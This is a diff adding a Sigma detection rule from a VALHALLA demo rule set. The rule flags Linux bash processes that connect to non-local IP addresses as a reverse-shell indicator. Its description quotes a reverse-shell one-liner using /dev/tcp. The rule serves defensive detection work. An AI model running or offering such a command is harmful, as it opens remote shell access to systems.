@@ -1,0 +1,41 @@
+
+# VALHALLA SIGMA RULE SET - DEMO
+# Retrieved: 2024-03-26 18:48
+# Generated for User: demo
+# Number of Rules: 3189
+# Warning:
+#     The full rule set contains rules with low level (< high) 
+#     that can lead to false positives - use the Python
+#     module valhallaAPI tools to retrieve a filtered set
+# This is the VALHALLA demo rule set. The content represents the 'SigmaHQ' repository
+# in a streamlined format.
+# All rules are licensed under DRL 1.1 https://github.com/SigmaHQ/sigma/blob/master/LICENSE.Detection.Rules.md.
+title: Linux Reverse Shell Indicator
+id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+status: test
+description: Detects a bash contecting to a remote IP address (often found when actors
+    do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
+author: Florian Roth (Nextron Systems)
+license: 'DRL 1.1 https://github.com/SigmaHQ/sigma/blob/master/LICENSE.Detection.Rules.md'
+date: 2021/10/16 13:44:11
+references:
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+logsource:
+    category: network_connection
+    product: linux
+detection:
+    condition: selection and not filter
+    filter:
+        DestinationIp:
+          - 127.0.0.1
+          - 0.0.0.0
+    selection:
+        Image|endswith: /bin/bash
+falsepositives: Unknown
+level: critical
+customer: 'demo'
+modified: 2022/12/25
+tags:
+  - attack.execution
+  - attack.t1059.004
+  - DEMO
